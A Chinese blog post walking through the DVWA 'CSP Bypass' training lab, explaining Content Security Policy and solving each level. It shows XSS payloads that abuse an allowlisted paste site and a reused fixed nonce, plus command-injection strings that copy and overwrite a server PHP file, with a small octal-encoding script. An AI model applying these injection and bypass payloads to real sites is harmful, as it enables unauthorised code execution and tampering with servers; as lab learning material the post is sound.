<!doctype html><html lang=zh><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>DVWA上手记录-CSP BYPASS</title><meta content="DVWA上手记录-CSP BYPASS" name=title><meta content=一点点从这个世界上消失。 name=description><meta content=website property=og:type><meta content=https://nnnewb.github.io/posts/2022/get-start-dvwa-12/ property=og:url><meta content="weakptr's blog" property=og:site_name><meta content="DVWA上手记录-CSP BYPASS" property=og:title><meta content=一点点从这个世界上消失。 property=og:description><meta content=https://nnnewb.github.io/image/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://nnnewb.github.io/posts/2022/get-start-dvwa-12/ property=twitter:url><meta content="DVWA上手记录-CSP BYPASS" property=twitter:title><meta content=一点点从这个世界上消失。 property=twitter:description><meta content=https://nnnewb.github.io/image/favicon.ico property=twitter:image><link href=https://nnnewb.github.io/posts/2022/get-start-dvwa-12/ rel=canonical><link rel="shortcut icon" href=https://nnnewb.github.io/image/favicon.ico type=image/x-icon><link href=https://nnnewb.github.io/css/reset.css rel=stylesheet><link href=https://nnnewb.github.io/css/pallete.css rel=stylesheet><link href=https://nnnewb.github.io/css/suCSS.css rel=stylesheet><link href=https://nnnewb.github.io/archive.css rel=stylesheet><link href=https://nnnewb.github.io/style.css rel=stylesheet><script defer src=https://nnnewb.github.io/js/script.js></script><link crossorigin href=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css integrity=sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y rel=stylesheet><script crossorigin defer integrity=sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js></script><script crossorigin defer integrity=sha384-zWYbd0NBwgTsgIdFKVprSfTh1mbMPe5Hz1X3yY4Sd1h/K1cQoUe36OGwAGz/PcDy src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/mathtex-script-type.min.js></script><script crossorigin defer integrity=sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js></script><script>document.addEventListener("DOMContentLoaded", function () {
        renderMathInElement(document.body, {
            // customised options
            // • auto-render specific keys, e.g.:
            delimiters: [
                { left: '$$', right: '$$', display: true },
                { left: '$', right: '$', display: false },
                { left: '\\(', right: '\\)', display: false },
                { left: '\\[', right: '\\]', display: false }
            ],
            // • rendering keys, e.g.:
            throwOnError: true
        });
    });</script><script src=https://cdn.jsdelivr.net/npm/mermaid@11.6.0/dist/mermaid.min.js></script><script>document.addEventListener('DOMContentLoaded', function () {
        // 查找所有具有 'pre' 标签且类名为 'language-mermaid' 的元素
        const mermaidElements = document.getElementsByClassName('language-mermaid');
        for (let i = 0; i < mermaidElements.length; i++) {
            const el = mermaidElements.item(i);
            if (el.tagName === "PRE" && !el.classList.contains('mermaid')) {
                el.innerHTML = el.textContent;
                el.classList.add('mermaid');
            }
        }

        mermaid.initialize({ startOnLoad: true, theme: 'dark', });
    })</script><script>if (window.location.hostname.toLowerCase() !== 'localhost' && window.location.hostname !== '127.0.0.1') {
        var _hmt = _hmt || [];
        (function () {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?dbb9df33a2de52aede8bccd84a7493ad";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    }</script><link href=https://chinese-fonts-cdn.deno.dev/packages/lxgwwenkaibright/dist/LXGWBright-Medium/result.css rel=stylesheet><link href=https://chinese-fonts-cdn.deno.dev/packages/maple-mono-cn/dist/MapleMono-CN-Regular/result.css rel=stylesheet><body><header><nav id=nav-bar><a href=/> 首页 </a>  /  <a href=/posts/> 文章 </a>  /  <a href=/categories/> 分类 </a>  /  <a href=/tags/> 标签 </a>  /  <a href=/search/> 搜索 </a>  /  <div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://nnnewb.github.io/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://nnnewb.github.io/click.ogg type=audio/ogg></audio></div></nav></header><main><h1>DVWA上手记录-CSP BYPASS</h1><p class=author-line>作于：2022-04-29 12:00 ，预计阅读时间 6 分钟<article><h2 id=qian-yan>前言</h2><p>终于，DVWA快要打通关了。OWASP 2021 的 Top 10 里已经看不到 CSP 了。可能是合并到了 Injection 里，XSS也合并到 Injection 里了。一个 Injection 总结各种注入还是挺精辟的。<p>直接开干吧。<h2 id=yuan-li>原理</h2><p>CSP 是 <em>Content Security Policy</em> ，一种降低 XSS 攻击面的技术。简单概括下就是一种同源策略的扩展，用以约束 <code>&lt;script src="..."</code>、<code>&lt;img src="..."</code> 这样的外部来源。<p>比如说，设置 <code>Content-Security-Policy: script-src 'self'</code> 就会约束脚本<code>src</code>必须和当前页面同源。<p><code>Content-Security-Policy</code> 支持的策略非常多，懒得一一列举了，常见的有 <code>default-src</code> 、<code>script-src</code> 这些。<h2 id=jie-ti>解题</h2><h3 id=low-shou-ji-xin-xi>Low：收集信息</h3><p><img alt=image-20220429091729687 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-12/image-20220429091729687.webp><p>看介绍，直接填一个脚本链接，脚本会被包含进这个页面。尝试启动一个 http 服务器然后填入。<p><img alt=image-20220429091905350 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-12/image-20220429091905350.webp><pre style=color:#fdf4c1aa;background-color:#282828><code><span>Refused to load the script 'http://172.17.0.1:8000/1.js' because it violates the following Content Security Policy directive: "script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com". Note that 'script-src-elem' was not explicitly set, so 'script-src' is used as a fallback.
</span></code></pre><p>设置了<code>script-src</code>策略，注意到策略里允许了 <code>pastebin</code>、<code>hastebin</code>、<code>toptal</code> 这些网站。<h3 id=low-jie-ti>Low：解题</h3><p>在 <code>hastebin.com</code> 写一句 <code>alert(1)</code> ，保存并取纯文本链接，然后贴到这里。<p><img alt=image-20220429092314962 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-12/image-20220429092314962.webp><p>成功。<h3 id=medium-shou-ji-xin-xi>Medium：收集信息</h3><p><img alt=image-20220429092433248 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-12/image-20220429092433248.webp><p>提示不管写什么都会直接丢到这里，看你能不能弹出个<code>alert</code>。<p>尝试写一个<code>&lt;script>alert(1)&lt;/script></code>，发现出错：<pre style=color:#fdf4c1aa;background-color:#282828><code><span>Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA='". Note that 'unsafe-inline' is ignored if either a hash or nonce value is present in the source list.
</span></code></pre><p>提示CSP禁止了inline脚本，但后面备注<code>unsafe-inline</code>会在源列表里有<code>hash</code>和<code>nonce</code>的情况下忽略。<h3 id=medium-jie-ti>Medium：解题</h3><p>尝试在 payload 上加上 <code>nonce</code>：<code>&lt;script nonce>alert(1)&lt;/script></code>，错误不变。<p>加上 <code>src</code>，随便选一个真实存在的 js：<code>&lt;script src="/dvwa/js/dvwaPage.js" nonce>alert(1)&lt;/script></code>，错误消失。但脚本没有执行。无奈看了下帮助，提示注意 CSP 的 <code>nonce</code> 策略。于是翻了下请求历史，发现 <code>nonce</code> 不变。<p>于是修改 payload，<code>nonce</code> 设置为固定值：<code>&lt;script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)&lt;/script></code><p><img alt=image-20220429093610302 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-12/image-20220429093610302.webp><p>需要注意的是 <code>nonce-</code> 这个前缀不用放到 <code>script</code> 标签的 <code>nonce</code> 里。<h3 id=high-shou-ji-xin-xi>High：收集信息</h3><p><img alt=image-20220429093750904 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-12/image-20220429093750904.webp><p>点击<code>Solve the sum</code>后：<p><img alt=image-20220429093808724 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-12/image-20220429093808724.webp><p>提示是修改指定的页面来运行自己的代码，怪。这要怎么做？没思路了，看一眼帮助，并没有帮助。<p>这一次的 <code>Content-Security-Policy</code>是<code>script-src 'self'</code>，点击<code>Solve the sum</code>产生请求<code>jsonp.php?callback=solveSum</code>。返回结果是一个 js 脚本。审阅代码没有包含 <code>jsonp.php</code> 的内容。<p>好吧。先试试请求 <code>jsonp.php</code>，改一下<code>callback</code>参数，请求<code>http://localhost:8080/vulnerabilities/csp/source/jsonp.php?alert</code>。结果返回一个空页面，没有js。所以提示还是对的，只能改<code>jsonp.php</code>文件完成High难度。<p>改法可以很简单=。=我们先拿命令注入提取出<code>jsonp.php</code>文件，方便下载。<pre style=color:#fdf4c1aa;background-color:#282828><code><span>n|cp /var/www/html/vulnerabilities/csp/source/jsonp.php /var/www/html/jsonp.txt
</span></code></pre><p>然后访问<code>/jsonp.txt</code>拿到内容：<pre class=language-php data-lang=php style=color:#fdf4c1aa;background-color:#282828><code class=language-php data-lang=php><span>&lt;?php
</span><span style=color:#fabd2f>header</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"Content-Type: application/json; charset=UTF-8"</span><span style=color:#fdf4c1>);
</span><span style=color:#fdf4c1>
</span><span style=color:#fa5c4b>if </span><span style=color:#fdf4c1>(</span><span style=color:#fabd2f>array_key_exists </span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"callback"</span><span style=color:#fdf4c1>, $_GET)) {
</span><span style=color:#fdf4c1>	$callback </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>$_GET[</span><span style=color:#b8bb26>'callback'</span><span style=color:#fdf4c1>];
</span><span style=color:#fdf4c1>} </span><span style=color:#fa5c4b>else </span><span style=color:#fdf4c1>{
</span><span style=color:#fdf4c1>	</span><span style=color:#fa5c4b>return </span><span style=color:#b8bb26>""</span><span style=color:#fdf4c1>;
</span><span style=color:#fdf4c1>}
</span><span style=color:#fdf4c1>
</span><span style=color:#fdf4c1>$outp </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>array </span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"answer" </span><span style=color:#fe8019>=> </span><span style=color:#b8bb26>"15"</span><span style=color:#fdf4c1>);
</span><span style=color:#fdf4c1>
</span><span style=color:#fabd2f>echo </span><span style=color:#fdf4c1>$callback </span><span style=color:#fe8019>. </span><span style=color:#b8bb26>"("</span><span style=color:#fe8019>.</span><span style=color:#fabd2f>json_encode</span><span style=color:#fdf4c1>($outp)</span><span style=color:#fe8019>.</span><span style=color:#b8bb26>")"</span><span style=color:#fdf4c1>;
</span><span>?>
</span></code></pre><p>emm，没什么特别的，接着看下前端怎么处理 <code>jsonp.php</code> 返回的内容。<pre class=language-js data-lang=js style=color:#fdf4c1aa;background-color:#282828><code class=language-js data-lang=js><span style=color:#fa5c4b>function </span><span style=color:#8ec07c>clickButton</span><span>() {
</span><span>    </span><span style=color:#fa5c4b>var </span><span style=color:#fdf4c1>s </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>document</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>createElement</span><span>(</span><span style=color:#b8bb26>"script"</span><span>);
</span><span>    </span><span style=color:#fdf4c1>s</span><span>.</span><span style=color:#fdf4c1>src </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"source/jsonp.php?callback=solveSum"</span><span>;
</span><span>    </span><span style=color:#fabd2f>document</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>body</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>appendChild</span><span>(</span><span style=color:#fdf4c1>s</span><span>);
</span><span>}
</span><span>
</span><span style=color:#fa5c4b>function </span><span style=color:#8ec07c>solveSum</span><span>(</span><span style=color:#fdf4c1>obj</span><span>) {
</span><span>    </span><span style=color:#fa5c4b>if </span><span>(</span><span style=color:#b8bb26>"answer" </span><span style=color:#fe8019>in </span><span style=color:#fdf4c1>obj</span><span>) {
</span><span>        </span><span style=color:#fabd2f>document</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>getElementById</span><span>(</span><span style=color:#b8bb26>"answer"</span><span>).</span><span style=color:#fdf4c1>innerHTML </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>obj</span><span>[</span><span style=color:#b8bb26>'answer'</span><span>];
</span><span>    }
</span><span>}
</span><span>
</span><span style=color:#fa5c4b>var </span><span style=color:#fdf4c1>solve_button </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>document</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>getElementById </span><span>(</span><span style=color:#b8bb26>"solve"</span><span>);
</span><span>
</span><span style=color:#fa5c4b>if </span><span>(</span><span style=color:#fdf4c1>solve_button</span><span>) {
</span><span>    </span><span style=color:#fdf4c1>solve_button.</span><span style=color:#fabd2f>addEventListener</span><span>(</span><span style=color:#b8bb26>"click"</span><span>, </span><span style=color:#fa5c4b>function</span><span>() {
</span><span>        </span><span style=color:#8ec07c>clickButton</span><span>();
</span><span>    });
</span><span>}
</span></code></pre><p>重点来了：<pre class=language-js data-lang=js style=color:#fdf4c1aa;background-color:#282828><code class=language-js data-lang=js><span style=color:#fa5c4b>var </span><span style=color:#fdf4c1>s </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>document</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>createElement</span><span>(</span><span style=color:#b8bb26>"script"</span><span>);
</span><span style=color:#fdf4c1>s</span><span>.</span><span style=color:#fdf4c1>src </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"source/jsonp.php?callback=solveSum"</span><span>;
</span><span style=color:#fabd2f>document</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>body</span><span style=color:#fdf4c1>.</span><span style=color:#fabd2f>appendChild</span><span>(</span><span style=color:#fdf4c1>s</span><span>);
</span></code></pre><p>直接把 <code>jsonp.php</code> 返回的内容当成了 <code>script</code> 标签的内容，也就是在 <code>jsonp.php</code> 返回随便什么东西前端都会执行。<p>那下一步就容易了，利用命令注入漏洞注入一个新的 php 标签，并输出 <code>alert</code>。先写一个脚本把脚本编码成<code>printf</code> 接受的8进制转义。<pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span>encoded </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>''
</span><span>payload </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>'&lt;?php echo \'alert(1)\'; ?>'
</span><span style=color:#fa5c4b>for </span><span>c </span><span style=color:#fa5c4b>in </span><span>payload:
</span><span>    </span><span style=color:#fa5c4b>if </span><span>c </span><span style=color:#fe8019>in </span><span style=color:#b8bb26>'()&|-$`;\''</span><span>:
</span><span>    	encoded </span><span style=color:#fe8019>+= </span><span style=color:#b8bb26>'\\0</span><span style=color:#fdf4c1>{:o}</span><span style=color:#b8bb26>'</span><span style=color:#fdf4c1>.format(</span><span style=color:#fabd2f>ord</span><span style=color:#fdf4c1>(c))
</span><span>    </span><span style=color:#fa5c4b>else</span><span>:
</span><span>        encoded </span><span style=color:#fe8019>+= </span><span>c
</span></code></pre><p>得到结果之后，变形一下payload：<code>127.0.0.1|printf '&lt;?php echo \047alert\0501\051\047\073 ?>'>>/var/www/html/jsonp.txt</code>。执行后检查：<p><img alt=image-20220429103150056 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-12/image-20220429103150056.webp><p>再真正注入到 <code>jsonp.php</code> 里。<code>127.0.0.1|printf '&lt;?php echo \047alert\0501\051\047\073 ?>'>>/var/www/html/vulnerabilities/csp/source/jsonp.php</code>，返回后发现有语法错误。<p><img alt=image-20220429103315118 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-12/image-20220429103315118.webp><p>是我大意了=。=算了，直接覆盖掉 <code>jsonp.php</code> 完事。<code>127.0.0.1|printf '&lt;?php echo \047alert\0501\051\047\073 ?>'>/var/www/html/vulnerabilities/csp/source/jsonp.php</code><p><img alt=image-20220429103448845 src=https://nnnewb.github.io/posts/2022/get-start-dvwa-12/image-20220429103448845.webp><p>成功。<h2 id=zong-jie>总结</h2><p>一定要总结的话就是确实有黑客思维这回事。题目并不是真的在考一个固定知识点，虽然是在CSP题，但真正的关键工作是在命令注入完成的，只是观察CSP这个页面的话是什么也干不成的，即使没有 CSP 干瞪着这个页面也干不成，就算有创建<code>script</code>标签设置内容的<code>js</code>也利用不到。<p>但抱怨还是有抱怨的。因为我通关DVWA的目的是学习=。=CSP的 High 难度选择用命令注入当突破口，对了解 CSP 本身就没啥用了，命令注入本身可以干的事情就远不止弄死一个 CSP 这么点=。=<p>总之，也行吧。多少对 CSP 有点了解了。</article><p class=tags-data><a href=/tags/security>/security/</a> <a href=/tags/dvwa>/dvwa/</a></p><script data-repo-id="MDEwOlJlcG9zaXRvcnkzOTg0ODYyMTg=" async crossorigin data-category=Announcements data-category-id=DIC_kwDOF8Bqys4Cegmn data-emit-metadata=0 data-input-position=bottom data-lang=zh-CN data-mapping=pathname data-reactions-enabled=1 data-repo=nnnewb/nnnewb.github.io data-strict=0 data-theme=noborder_light id=giscus_script src=https://giscus.app/client.js></script></main><footer><hr><div id=footer-container><div><p style=text-align:center>Copyright © 2018-2024 weakptr <a href=mailto:weak_ptr@outlook.com>&lt;weak_ptr@outlook.com></a><p style=text-align:center>Built with <a rel="noopener noreferrer" href=https://www.getzola.org target=_blank>Zola</a> using <a rel="noopener noreferrer" href=https://github.com/Speyll/anemone target=_blank>anemone</a> theme, <a rel="noopener noreferrer" href=https://speyll.github.io/suCSS/ target=_blank>suCSS</a> framework & <a rel="noopener noreferrer" href=https://github.com/Speyll/veqev target=_blank>veqev</a>, modified by <a rel="noopener noreferrer" href=https://github.com/nnnewb/ target=_blank>nnnewb</a>.<p style=text-align:center>Theme and color theme licensed under <a rel="noopener noreferrer" href=https://en.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a>.</div></div></footer>